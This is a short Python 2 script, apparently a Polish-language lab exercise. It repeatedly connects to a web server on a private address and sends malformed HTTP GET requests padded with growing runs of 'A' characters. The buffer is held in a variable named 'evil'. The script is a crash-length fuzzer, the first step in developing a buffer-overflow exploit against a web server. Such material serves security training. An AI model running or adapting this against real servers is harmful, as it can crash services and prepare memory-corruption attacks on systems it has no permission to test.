zad2_l.py

import socket,sys,time

size = 100
while(size < 10000):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ip = ('192.168.31.209',80)
        sock.connect(ip)
        print "\ntest dla %s" % size
        evil  = "GET"
        evil += "A" * size
        #musimy poprawnie dla http skonstrulowac naglowej 
        evil += "HTTP/1.1\r\n\r\n"
        sock.send(evil)
        sock.close()
        size += 300
        time.sleep(5)

